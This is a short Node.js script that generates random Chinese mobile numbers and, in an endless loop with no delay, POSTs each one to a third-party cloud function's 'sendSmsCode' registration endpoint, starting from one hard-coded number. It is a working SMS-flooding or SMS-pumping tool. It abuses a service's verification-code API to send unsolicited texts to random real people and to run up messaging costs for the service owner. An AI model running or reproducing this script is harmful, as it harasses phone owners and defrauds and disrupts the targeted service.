const request = require('request');

function getMoble() {
  var prefixArray = new Array("130", "131", "132", "133", "135", "137", "138", "170", "187", "189");

  var i = parseInt(10 * Math.random());

  var prefix = prefixArray[i];

  for (var j = 0; j < 8; j++) {
    prefix = prefix + Math.floor(Math.random() * 10);

  }

  return prefix;

}
function send(phone) {
  const options = {
    method: 'POST',
    url: 'https://e9be6b26-4836-411a-b7a7-a987467041f7.bspapp.com/http/api',
    headers: { 'user-agent': 'vscode-restclient', 'content-type': 'application/json' },
    body: {
      url: 'account',
      action: 'sendSmsCode',
      check: false,
      data: { mobile: phone, code: '958844', type: 'register', templateId: '10005' }
    },
    json: true
  };

  request(options, function (error, response, body) {
    if (error) throw new Error(error);
    else {
      setTimeout(() => {
        send(`${getMoble()}`)
      }, 0);
      console.log(body);
    }

  });
}
send('13652635122')
